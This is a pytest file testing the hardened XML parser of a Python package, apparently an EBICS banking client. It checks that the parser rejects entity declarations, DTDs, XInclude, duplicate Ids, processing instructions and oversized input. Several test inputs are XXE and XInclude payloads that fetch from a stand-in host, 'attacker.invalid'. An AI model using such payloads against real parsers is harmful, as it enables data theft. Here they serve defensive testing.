import pytest

from ebicsmit import ResponseLimitError, XmlSecurityError
from ebicsmit.xml import XmlLimits, parse_xml_document


def test_rejects_dtd_and_entity_declarations() -> None:
    payloads = (
        b'<!DOCTYPE root [<!ENTITY x "expanded">]><root>&x;</root>',
        b'<!DOCTYPE root SYSTEM "https://attacker.invalid/evil.dtd"><root/>',
    )
    for payload in payloads:
        with pytest.raises(XmlSecurityError):
            parse_xml_document(payload)


def test_rejects_xinclude() -> None:
    payload = (
        b'<root xmlns:xi="http://www.w3.org/2001/XInclude">'
        b'<xi:include href="https://attacker.invalid/secret"/></root>'
    )
    with pytest.raises(XmlSecurityError):
        parse_xml_document(payload)


def test_rejects_duplicate_ids_for_signature_wrapping_defense() -> None:
    with pytest.raises(XmlSecurityError):
        parse_xml_document(b'<root><a Id="same"/><b Id="same"/></root>')


def test_enforces_input_depth_element_and_text_limits() -> None:
    with pytest.raises(TypeError):
        XmlLimits(max_elements=1.5)  # type: ignore[arg-type]
    with pytest.raises(ResponseLimitError):
        parse_xml_document(b"<root/>", XmlLimits(max_input_bytes=3))
    with pytest.raises(ResponseLimitError):
        parse_xml_document(b"<a><b><c/></b></a>", XmlLimits(max_depth=2))
    with pytest.raises(ResponseLimitError):
        parse_xml_document(b"<a><b/><c/></a>", XmlLimits(max_elements=2))
    with pytest.raises(ResponseLimitError):
        parse_xml_document(b"<a>12345</a>", XmlLimits(max_text_bytes=4))


def test_rejects_processing_instructions_and_malformed_xml() -> None:
    for payload in (
        b"<?unsafe before?><root/>",
        b"<root><?unsafe value?></root>",
        b"<root/><?unsafe after?>",
        b"<!--before--><root/>",
        b"<root/><!--after-->",
    ):
        with pytest.raises(XmlSecurityError):
            parse_xml_document(payload)
    with pytest.raises(XmlSecurityError):
        parse_xml_document(b"<root>")
    with pytest.raises(XmlSecurityError):
        parse_xml_document("<root/>".encode("utf-16"))


def test_parses_small_synthetic_namespace_document() -> None:
    root = parse_xml_document(b'<root xmlns="urn:synthetic"><child>ok</child></root>')
    assert root.tag == "{urn:synthetic}root"
